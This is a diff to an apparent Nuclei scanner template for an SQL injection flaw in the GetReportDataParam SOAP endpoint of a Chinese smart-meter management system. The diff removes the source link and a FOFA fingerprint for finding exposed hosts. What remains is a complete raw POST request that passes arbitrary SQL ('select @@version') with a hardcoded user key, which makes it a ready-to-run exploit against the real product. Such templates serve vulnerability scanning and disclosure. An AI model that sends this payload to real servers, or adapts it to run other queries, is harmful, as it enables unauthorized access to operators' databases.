@@ -3,12 +3,8 @@ info:
   name: 智能表综合管理系统GetReportDataParam 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ai7342n1an9lvzah'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ai7342n1an9lvzah
-    fofa: body="headerTableWrap"
 http:
 - raw:
   - "POST /SunReportService.asmx HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.1868.41 Safari/537.36\nContent-Type: text/xml; charset=utf-8\nSOAPAction: \"http://suntront.com/GetReportDataParam \"\nContent-Length: 456\nConnection: close\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetReportDataParam xmlns=\"http://suntront.com/\">\n      <sqltxt>select @@version</sqltxt>\n      <SqlParam>{\"a\":\"1\"}</SqlParam>\n      <Userkey>XTSunReport</Userkey>\n    </GetReportDataParam>\n  </soap:Body>\n</soap:Envelope>"
